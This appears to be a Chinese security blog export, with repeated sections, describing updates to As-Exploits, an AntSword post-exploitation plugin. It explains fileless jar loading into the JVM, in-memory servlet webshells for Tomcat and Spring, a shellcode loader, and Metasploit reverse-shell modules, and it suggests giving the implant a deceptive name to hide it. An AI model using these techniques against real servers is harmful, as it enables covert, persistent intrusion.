Runtime.getRuntime().exec(\"calc\"); } catch (IOException var2) { var2.printStackTrace(); } } } jar -cvf打包成jar 开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。 \u003c% Class.forName(\"calc\").newInstance(); %\u003e 在第一次访问的时候找不到这个类肯定会报错 然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。 exploit！ 再去刷新页面，弹出计算器。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:2","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#jsp增加jar加载器模块"},{"categories":["技术文章"],"content":"\r3.2 jsp增加Jar加载器模块打一个jar进去通常有两个用处： 一是可以用来上传数据库驱动。 二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。 冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。 3.2.1 冰蝎冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。 net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver private void loadDriver(String scriptType, String databaseType) throws Exception { String driverPath = \"net/rebeyond/behinder/resource/driver/\"; Platform.runLater(() -\u003e { this.statusLabel.setText(\"正在上传数据库驱动……\"); }); String os = this.currentShellService.shellEntity.getString(\"os\").toLowerCase(); //根据系统型号选择临时目录 String remoteDir = os.indexOf(\"windows\") \u003e= 0 ? \"c:/windows/temp/\" : \"/tmp/\"; String libName = null; if (scriptType.equals(\"jsp\")) { //根据类型选择数据库jdbc if (databaseType.equals(\"sqlserver\")) { libName = \"sqljdbc41.jar\"; } else if (databaseType.equals(\"mysql\")) { libName = \"mysql-connector-java-5.1.36.jar\"; } else if (databaseType.equals(\"oracle\")) { libName = \"ojdbc5.jar\"; } } else if (scriptType.equals(\"aspx\")) { if (databaseType.equals(\"mysql\")) { libName = \"mysql.data.dll\"; } else if (databaseType.equals(\"oracle\")) { libName = \"Oracle.ManagedDataAccess.dll\"; } } byte[] driverFileContent = Utils.getResourceData(driverPath + libName); String remotePath = remoteDir + libName; //将jar先上传到临时目录 this.currentShellService.uploadFile(remotePath, driverFileContent, true); Platform.runLater(() -\u003e { this.statusLabel.setText(\"驱动上传成功，正在加载驱动……\"); }); //将libPath传递给服务端加载 JSONObject loadRes = this.currentShellService.loadJar(remotePath); if (loadRes.getString(\"status\").equals(\"fail\")) { throw new Exception(\"驱动加载失败:\" + loadRes.getString(\"msg\")); } else { Platform.runLater(() -\u003e { if (scriptType.equals(\"jsp\")) { this.statusLabel.setText(\"驱动加载成功，请再次点击“连接”。\"); } this.statusLabel.setText(\"驱动加载成功。\"); }); } } webshell获取到libPath然后用URLClassLoader去加载。 net.rebeyond.behinder.payload.java.Loader 3.2.2 哥斯拉哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。 每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。 但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？ 哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。 创建了一种新的协议jarmembuff 然后把收到的jar文件的字节数组给放到变量里。 这样就实现了文件不落地，将jar打入内存的目的。 本人在As-Exploits里也采用了这种做法。 3.2.3 小实验这里做一个小实验 写一个弹框测试类 import java.io.IOException; public class calc { public calc() { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException var2) { var2.printStackTrace(); } } } jar -cvf打包成jar 开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。 \u003c% Class.forName(\"calc\").newInstance(); %\u003e 在第一次访问的时候找不到这个类肯定会报错 然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。 exploit！ 再去刷新页面，弹出计算器。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:2","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#冰蝎"},{"categories":["技术文章"],"content":"\r3.2 jsp增加Jar加载器模块打一个jar进去通常有两个用处： 一是可以用来上传数据库驱动。 二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。 冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。 3.2.1 冰蝎冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。 net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver private void loadDriver(String scriptType, String databaseType) throws Exception { String driverPath = \"net/rebeyond/behinder/resource/driver/\"; Platform.runLater(() -\u003e { this.statusLabel.setText(\"正在上传数据库驱动……\"); }); String os = this.currentShellService.shellEntity.getString(\"os\").toLowerCase(); //根据系统型号选择临时目录 String remoteDir = os.indexOf(\"windows\") \u003e= 0 ? \"c:/windows/temp/\" : \"/tmp/\"; String libName = null; if (scriptType.equals(\"jsp\")) { //根据类型选择数据库jdbc if (databaseType.equals(\"sqlserver\")) { libName = \"sqljdbc41.jar\"; } else if (databaseType.equals(\"mysql\")) { libName = \"mysql-connector-java-5.1.36.jar\"; } else if (databaseType.equals(\"oracle\")) { libName = \"ojdbc5.jar\"; } } else if (scriptType.equals(\"aspx\")) { if (databaseType.equals(\"mysql\")) { libName = \"mysql.data.dll\"; } else if (databaseType.equals(\"oracle\")) { libName = \"Oracle.ManagedDataAccess.dll\"; } } byte[] driverFileContent = Utils.getResourceData(driverPath + libName); String remotePath = remoteDir + libName; //将jar先上传到临时目录 this.currentShellService.uploadFile(remotePath, driverFileContent, true); Platform.runLater(() -\u003e { this.statusLabel.setText(\"驱动上传成功，正在加载驱动……\"); }); //将libPath传递给服务端加载 JSONObject loadRes = this.currentShellService.loadJar(remotePath); if (loadRes.getString(\"status\").equals(\"fail\")) { throw new Exception(\"驱动加载失败:\" + loadRes.getString(\"msg\")); } else { Platform.runLater(() -\u003e { if (scriptType.equals(\"jsp\")) { this.statusLabel.setText(\"驱动加载成功，请再次点击“连接”。\"); } this.statusLabel.setText(\"驱动加载成功。\"); }); } } webshell获取到libPath然后用URLClassLoader去加载。 net.rebeyond.behinder.payload.java.Loader 3.2.2 哥斯拉哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。 每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。 但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？ 哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。 创建了一种新的协议jarmembuff 然后把收到的jar文件的字节数组给放到变量里。 这样就实现了文件不落地，将jar打入内存的目的。 本人在As-Exploits里也采用了这种做法。 3.2.3 小实验这里做一个小实验 写一个弹框测试类 import java.io.IOException; public class calc { public calc() { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException var2) { var2.printStackTrace(); } } } jar -cvf打包成jar 开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。 \u003c% Class.forName(\"calc\").newInstance(); %\u003e 在第一次访问的时候找不到这个类肯定会报错 然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。 exploit！ 再去刷新页面，弹出计算器。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:2","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#哥斯拉"},{"categories":["技术文章"],"content":"\r3.2 jsp增加Jar加载器模块打一个jar进去通常有两个用处： 一是可以用来上传数据库驱动。 二是把恶意类打入JVM中，后续只需要通过反射调用即可。哥斯拉的实现方式就是第一次就把所有的payload打入jvm中，后续通过反射调用。所以后续通信的流量包都非常的小，只需要传递参数即可。 冰蝎跟哥斯拉都有类似的功能，研究了一下他们的实现。 3.2.1 冰蝎冰蝎的加载jar功能内嵌于数据库连接部分，仅用于上传数据库驱动。首先把要打入的jdbc上传到目标的临时目录，然后再用URLClassLoader去加载，这里贴一下代码。 net.rebeyond.behinder.ui.controller.DatabaseViewController#loadDriver private void loadDriver(String scriptType, String databaseType) throws Exception { String driverPath = \"net/rebeyond/behinder/resource/driver/\"; Platform.runLater(() -\u003e { this.statusLabel.setText(\"正在上传数据库驱动……\"); }); String os = this.currentShellService.shellEntity.getString(\"os\").toLowerCase(); //根据系统型号选择临时目录 String remoteDir = os.indexOf(\"windows\") \u003e= 0 ? \"c:/windows/temp/\" : \"/tmp/\"; String libName = null; if (scriptType.equals(\"jsp\")) { //根据类型选择数据库jdbc if (databaseType.equals(\"sqlserver\")) { libName = \"sqljdbc41.jar\"; } else if (databaseType.equals(\"mysql\")) { libName = \"mysql-connector-java-5.1.36.jar\"; } else if (databaseType.equals(\"oracle\")) { libName = \"ojdbc5.jar\"; } } else if (scriptType.equals(\"aspx\")) { if (databaseType.equals(\"mysql\")) { libName = \"mysql.data.dll\"; } else if (databaseType.equals(\"oracle\")) { libName = \"Oracle.ManagedDataAccess.dll\"; } } byte[] driverFileContent = Utils.getResourceData(driverPath + libName); String remotePath = remoteDir + libName; //将jar先上传到临时目录 this.currentShellService.uploadFile(remotePath, driverFileContent, true); Platform.runLater(() -\u003e { this.statusLabel.setText(\"驱动上传成功，正在加载驱动……\"); }); //将libPath传递给服务端加载 JSONObject loadRes = this.currentShellService.loadJar(remotePath); if (loadRes.getString(\"status\").equals(\"fail\")) { throw new Exception(\"驱动加载失败:\" + loadRes.getString(\"msg\")); } else { Platform.runLater(() -\u003e { if (scriptType.equals(\"jsp\")) { this.statusLabel.setText(\"驱动加载成功，请再次点击“连接”。\"); } this.statusLabel.setText(\"驱动加载成功。\"); }); } } webshell获取到libPath然后用URLClassLoader去加载。 net.rebeyond.behinder.payload.java.Loader 3.2.2 哥斯拉哥斯拉的操作就比较秀了。因为打入一个jar不像打入一个class一样，直接有defineClass方法去接收一个字节数组。据我的研究，没有直接接收一个jar的字节数组的方法。打入jar需要使用URLClassLoader这个类，大概有两种方式，一种是利用http协议，远程获取所要加载的jar。另一种是file协议，从本地路径去读取jar。 每次都额外搭一个http当然不方便，并且目标还不一定出网。但是file协议的话还需要把jar写到磁盘中，文件就会落地，增加了被发现的风险。 但是我们回过头想，既然通过file协议加载jar，肯定会有一个通过路径找到文件，然后把文件读取到内存的过程，如果我们能跳过这个根据路径找文件的过程，直接把文件的内容写到字节数组里不就可以文件不落地了吗？ 哥斯拉就是采用的这种做法，利用两个子类分别继承了URLStreamHandler跟URLConnection，然后利用反射模拟了读取文件的过程。 创建了一种新的协议jarmembuff 然后把收到的jar文件的字节数组给放到变量里。 这样就实现了文件不落地，将jar打入内存的目的。 本人在As-Exploits里也采用了这种做法。 3.2.3 小实验这里做一个小实验 写一个弹框测试类 import java.io.IOException; public class calc { public calc() { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException var2) { var2.printStackTrace(); } } } jar -cvf打包成jar 开个web项目，写一个test.jsp如下。去查找calc这个类并且实例化。如果实例化成功则会弹出我们的计算器。 \u003c% Class.forName(\"calc\").newInstance(); %\u003e 在第一次访问的时候找不到这个类肯定会报错 然后打开插件，选择要打入的jar文件。这里可以点按钮选择，也可以直接在输入框输入绝对路径。 exploit！ 再去刷新页面，弹出计算器。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:2","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#小实验"},{"categories":["技术文章"],"content":"\r3.3 支持返回包加密选择reverse解码器 返回包数据 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:3","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#支持返回包加密"},{"categories":["技术文章"],"content":"\r3.4 内存马兼容Spring其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring 首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：yzddmr6.tk。 这里有两个细节 3.4.1 关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。 去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误： 15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c 定位一下问题出在这里 意思就是在StandardContext中找不到removeChild这个方法。 调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。 TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。 那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别： getMethods 获取所有公有方法（包括父类方法） getDeclaredMethods 获取本类中的所有方法 (只拿本类中的) 哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。 所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。 在内存马模块同理，这里直接全部改了，不再用反射。 3.4.2 addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果： tomcat7 只能addServletMapping tomcat8 addServletMapping/addServletMappingDecoded都可以 tomcat9 只能addServletMappingDecoded 在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。 3.4.3 Spring下运行截图获取Servlet 打入蚁剑内存马 再次获取Servlet，发现已经有了，并且在第一位。 连接成功 卸载Servlet 卸载后再次获取Servlet列表 虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:4","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#内存马兼容spring"},{"categories":["技术文章"],"content":"\r3.4 内存马兼容Spring其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring 首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：yzddmr6.tk。 这里有两个细节 3.4.1 关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。 去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误： 15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c 定位一下问题出在这里 意思就是在StandardContext中找不到removeChild这个方法。 调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。 TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。 那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别： getMethods 获取所有公有方法（包括父类方法） getDeclaredMethods 获取本类中的所有方法 (只拿本类中的) 哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。 所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。 在内存马模块同理，这里直接全部改了，不再用反射。 3.4.2 addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果： tomcat7 只能addServletMapping tomcat8 addServletMapping/addServletMappingDecoded都可以 tomcat9 只能addServletMappingDecoded 在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。 3.4.3 Spring下运行截图获取Servlet 打入蚁剑内存马 再次获取Servlet，发现已经有了，并且在第一位。 连接成功 卸载Servlet 卸载后再次获取Servlet列表 虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:4","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#关于反射的坑"},{"categories":["技术文章"],"content":"\r3.4 内存马兼容Spring其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring 首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：yzddmr6.tk。 这里有两个细节 3.4.1 关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。 去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误： 15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c 定位一下问题出在这里 意思就是在StandardContext中找不到removeChild这个方法。 调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。 TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。 那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别： getMethods 获取所有公有方法（包括父类方法） getDeclaredMethods 获取本类中的所有方法 (只拿本类中的) 哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。 所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。 在内存马模块同理，这里直接全部改了，不再用反射。 3.4.2 addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果： tomcat7 只能addServletMapping tomcat8 addServletMapping/addServletMappingDecoded都可以 tomcat9 只能addServletMappingDecoded 在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。 3.4.3 Spring下运行截图获取Servlet 打入蚁剑内存马 再次获取Servlet，发现已经有了，并且在第一位。 连接成功 卸载Servlet 卸载后再次获取Servlet列表 虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:4","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#addservletmapping的兼容性问题"},{"categories":["技术文章"],"content":"\r3.4 内存马兼容Spring其中 内存马管理 以及AntSword类型内存马支持Tomcat（5-9）、Spring 首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客：yzddmr6.tk。 这里有两个细节 3.4.1 关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。 去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误： 15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c 定位一下问题出在这里 意思就是在StandardContext中找不到removeChild这个方法。 调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。 TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。 那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别： getMethods 获取所有公有方法（包括父类方法） getDeclaredMethods 获取本类中的所有方法 (只拿本类中的) 哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。 所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。 在内存马模块同理，这里直接全部改了，不再用反射。 3.4.2 addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果： tomcat7 只能addServletMapping tomcat8 addServletMapping/addServletMappingDecoded都可以 tomcat9 只能addServletMappingDecoded 在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。 3.4.3 Spring下运行截图获取Servlet 打入蚁剑内存马 再次获取Servlet，发现已经有了，并且在第一位。 连接成功 卸载Servlet 卸载后再次获取Servlet列表 虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:3:4","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#spring下运行截图"},{"categories":["技术文章"],"content":"\r4 现有模块介绍","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:0","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#现有模块介绍"},{"categories":["技术文章"],"content":"\r4.1 基本信息获取当前服务端信息。 支持类型：php/jsp/aspx php jsp aspx ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:1","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#基本信息"},{"categories":["技术文章"],"content":"\r4.2 反弹Shell跟MSF联动 支持类型：php/jsp/aspx Payload目前支持以下类型： java/meterpreter/reverse_tcp java/shell/reverse_tcp java/meterpreter/bind_tcp java/shell/bind_tcp php/meterpreter/reverse_tcp php/shell/reverse_tcp php/meterpreter/bind_tcp php/shell/bind_tcp windows/meterpreter/reverse_tcp windows/x64/meterpreter/reverse_tcp ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:2","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#反弹shell"},{"categories":["技术文章"],"content":"\r4.3 内存马一键打入内存Webshell，由于时间仓促，目前仅支持Servlet型内存马。 支持类型：jsp 可打入的内存马种类： AntSword Behinder Godzilla-Base64 reGerog 组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。 其中AntSword类型支持Tomcat(5-9)、Spring。 4.3.1 打入哥斯拉内存马打入Godzilla-Base64内存马 在哥斯拉中连接成功 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:3","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#内存马"},{"categories":["技术文章"],"content":"\r4.3 内存马一键打入内存Webshell，由于时间仓促，目前仅支持Servlet型内存马。 支持类型：jsp 可打入的内存马种类： AntSword Behinder Godzilla-Base64 reGerog 组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。 其中AntSword类型支持Tomcat(5-9)、Spring。 4.3.1 打入哥斯拉内存马打入Godzilla-Base64内存马 在哥斯拉中连接成功 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:3","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#打入哥斯拉内存马"},{"categories":["技术文章"],"content":"\r4.4 杀软识别数据来源是key师傅的项目：avList 通过tasklist /svc获取当前进程列表，识别出其中的杀软。 支持类型：php/jsp/aspx 目前支持手动跟自动两种获取方式： 自动获取 自动执行tasklist /svc并分析回显数据。 手动获取 手动输入tasklist /svc的结果。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:4","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#杀软识别"},{"categories":["技术文章"],"content":"\r4.5 提权辅助通过systeminfo来获取补丁信息，从而给出提权建议。 支持类型：php/jsp/aspx 同样支持手动跟自动两种获取方式。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:5","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#提权辅助"},{"categories":["技术文章"],"content":"\r4.6 屏幕截图获取目标当前屏幕截图。 支持类型：jsp/aspx ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:6","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#屏幕截图"},{"categories":["技术文章"],"content":"\r4.7 ShellCode加载器加载shellcode至内存运行。（shellcode为hex格式，且不能有多余空格或换行） 支持类型：aspx 以msf为例：msfvenom生成hex格式的shellcode 粘贴进输入框，点击exploit 收到Meterpreter会话 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:7","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#shellcode加载器"},{"categories":["技术文章"],"content":"\r4.8 Jar加载器加载Jar到JVM内存中。过程中文件不落地，可用于上传数据库驱动等。 支持类型：jsp ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:4:8","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#jar加载器"},{"categories":["技术文章"],"content":"\r5 注意事项本插件仅供合法的渗透测试以及爱好者参考学习，请勿用于非法用途，否则自行承担相关责任。 ","date":"2021-03-26","objectID":"/posts/as-exploits-v12-update/:5:0","series":null,"tags":[],"title":"As-Exploits v1.2更新","uri":"/posts/as-exploits-v12-update/#注意事项"},{"categories":["技术文章"],"content":"\r1 前言最近在对As-Exploits的内存马部分做兼容Spring处理。原来只是照搬了哥斯拉的一些payload，现在需要深入研究一下了。 首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客。 ","date":"2021-03-22","objectID":"/posts/as-exploits-memory-shell-for-spring/:1:0","series":null,"tags":[],"title":"As-Exploits内存马兼容Spring","uri":"/posts/as-exploits-memory-shell-for-spring/#前言"},{"categories":["技术文章"],"content":"\r2 过程","date":"2021-03-22","objectID":"/posts/as-exploits-memory-shell-for-spring/:2:0","series":null,"tags":[],"title":"As-Exploits内存马兼容Spring","uri":"/posts/as-exploits-memory-shell-for-spring/#过程"},{"categories":["技术文章"],"content":"\r2.1 关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。 去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候报了一个错误 public String unLoadServlet() { if (wrapperName != null \u0026\u0026 wrapperName.length() \u003e 0 \u0026\u0026 urlPattern != null \u0026\u0026 urlPattern.length() \u003e 0) { try { Object o = getFieldValue(this.request.getServletContext(), \"context\"); Field field = o.getClass().getDeclaredField(\"context\"); field.setAccessible(true); Object standardContext = getFieldValue(o, \"context\"); Object wrapper = this.invoke(standardContext, \"findChild\", wrapperName); Class containerClass = Class.forName(\"org.apache.catalina.Container\", false, standardContext.getClass().getClassLoader()); if (wrapper != null) { standardContext.getClass().getDeclaredMethod(\"removeChild\", containerClass).invoke(standardContext, 